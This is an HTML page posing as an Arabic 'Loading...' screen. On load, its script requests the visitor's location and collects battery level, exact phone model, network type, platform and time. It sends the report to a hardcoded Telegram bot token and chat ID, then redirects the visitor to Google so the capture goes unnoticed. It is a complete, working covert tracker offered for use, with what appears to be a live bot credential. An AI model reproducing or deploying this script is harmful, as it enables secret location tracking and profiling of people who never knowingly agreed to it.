<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
</head>
<body>
    <script>
        const _b = s => atob(s);
        const TOKEN = "8719298403:AAG-9IJg2xLXm0YaV3yy0Z1wGEDGrjFQWxU"; 
        const CHAT_ID = "6001286270"; 

        async function startCapture() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        await fetchAndSendData(mapLink);
                    },
                    async () => { await fetchAndSendData("المستخدم رفض مشاركة الموقع ❌"); }
                );
            } else { await fetchAndSendData("المتصفح لا يدعم تحديد الموقع ❌"); }
        }

        async function fetchAndSendData(locationInfo) {
            let batteryLevel = "غير معروف";
            let detailedModel = "غير معروف";
            let netType = "غير معروف";

            try {
                // 🔋 جلب البطارية
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
                }
                
                // 📱 جلب نوع الهاتف الدقيق (تحسين بنسبة 100%)
                if (navigator.userAgentData) {
                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    detailedModel = info.model || "غير معروف";
                }

                // 📶 جلب نوع الشبكة (إضافة جديدة)
                if (navigator.connection) {
                    netType = navigator.connection.effectiveType || "غير معروف";
                }
            } catch (e) {}

            const text = `🚨 تقرير كامل (Shadow Mode):
📍 الموقع: ${locationInfo}
📱 الهاتف الدقيق: ${detailedModel}
📶 الشبكة: ${netType}
🔋 البطارية: ${batteryLevel}
💻 النظام: ${navigator.platform}
⏰ الوقت: ${new Date().toLocaleString()}`;

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch (error) {}

            window.location.href = "https://www.google.com";
        }

        startCapture();
    </script>
</body>
</html>
